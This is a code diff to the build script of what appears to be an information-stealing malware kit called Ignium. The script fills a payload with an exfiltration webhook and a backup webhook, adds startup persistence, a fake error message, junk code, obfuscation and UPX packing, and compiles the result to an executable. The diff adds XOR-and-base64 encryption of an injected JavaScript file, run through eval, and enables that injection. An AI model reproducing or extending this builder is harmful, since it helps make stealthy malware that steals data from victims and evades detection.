@@ -1,7 +1,7 @@
-import os, sys, subprocess, shutil, random, string, json, ctypes, socket, requests, fade
+import os, sys, subprocess, shutil, random, string, json, ctypes, socket, requests, fade, base64
 from datetime import datetime, timezone
 import tables
-from utils.payload import ignium_template
+from utils.payload import payme
 from utils.construct import BANNER, Spinner, generate_junk, obfuscate, wrap_in_base64
 
 def build():
@@ -18,10 +18,11 @@ def build():
     
     build_id = "#" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
     webhook = tables.WEBHOOK
+    bracket_l = fade.purpleblue("[").replace('\n', '')
+    bracket_r = fade.purpleblue("]").replace('\n', '')
+
     if not webhook or "YOUR_WEBHOOK_HERE" in webhook:
-        bracket_l = fade.purpleblue("[").replace('\n', '')
-        bracket_r = fade.purpleblue("]").replace('\n', '')
-        print(f"                 {bracket_l}\033[37m!\033[0m{bracket_r} \033[37mWebhook is Required.\033[0m")
+        print(f"               {bracket_l}\033[37m!\033[0m{bracket_r} \033[37mWebhook is Required.\033[0m")
         return
         
     fake_error = tables.FAKE_ERROR
@@ -32,15 +33,30 @@ def build():
     use_junk = tables.JUNK_CODE
     use_upx = tables.UPX
     
-    injection_js_content = ""
     inj_path = os.path.join("utils", "build", "injection.js")
+    injection_js_content = ""
     if os.path.exists(inj_path):
         with open(inj_path, "r", encoding='utf-8') as f:
-            injection_js_content = f.read()
-    
+            js_raw = f.read().replace("%WEBHOOK%", webhook)
+        
+        # Encrypt the injection JS
+        key = "".join(random.choices(string.ascii_letters, k=16))
+        encrypted = base64.b64encode(bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(js_raw.encode('utf-8'))])).decode()
+        injection_js_content = f"""
+const _k = "{key}";
+const _p = "{encrypted}";
+const _d = (p, k) => {{
+    const b = Buffer.from(p, 'base64');
+    return b.map((byte, i) => byte ^ k.charCodeAt(i % k.length)).toString('utf-8');
+}};
+eval(_d(_p, _k));
+"""
+
     with Spinner("Preparing Ignium Payload"):
         do_startup = tables.STARTUP
-        ignium_code = ignium_template.replace("%WEBHOOK%", webhook).replace("%INJECTION_JS%", repr(injection_js_content)).replace("%DO_INJECT%", "False").replace("%DO_STARTUP%", str(do_startup))
+        do_inject = tables.INJECTION
+        ignium_code = payme.replace("%WEBHOOK%", webhook).replace("%BACKUP_WEBHOOK%", tables.BACKUP_WEBHOOK).replace("%INJECTION_JS%", repr(injection_js_content)).replace("%DO_INJECT%", str(do_inject)).replace("%DO_STARTUP%", str(do_startup))
+        
         if fake_error:
             ignium_code += f"\nshow_error({repr(error_msg)})\n"
         ignium_code += "\nsR()\n"
@@ -51,7 +67,7 @@ def build():
         if do_obf:
             ignium_code = obfuscate(ignium_code)
             ignium_code = wrap_in_base64(ignium_code)
-    
+
         with open("ignium.py", "w", encoding='utf-8') as f:
             f.write(ignium_code)
 
@@ -82,13 +98,9 @@ def build():
         if os.path.exists("Ignium.exe"):
             os.remove("Ignium.exe")
         shutil.move("dist/ignium.exe", "Ignium.exe")
-        bracket_l = fade.purpleblue("[").replace('\n', '')
-        bracket_r = fade.purpleblue("]").replace('\n', '')
-        print(f"                 {bracket_l}\033[37m$\033[0m{bracket_r} \033[37mBuild {build_id} Completed\033[0m")
+        print(f"               {bracket_l}\033[37m$\033[0m{bracket_r} \033[37mBuild {build_id} Completed\033[0m")
     else:
-        bracket_l = fade.purpleblue("[").replace('\n', '')
-        bracket_r = fade.purpleblue("]").replace('\n', '')
-        print(f"                 {bracket_l}\033[37m!\033[0m{bracket_r} \033[37mBuild Failed!\033[0m")
+        print(f"               {bracket_l}\033[37m!\033[0m{bracket_r} \033[37mBuild Failed!\033[0m")
 
     for f in ["ignium.py", "ignium.spec"]:
         if os.path.exists(f): os.remove(f)
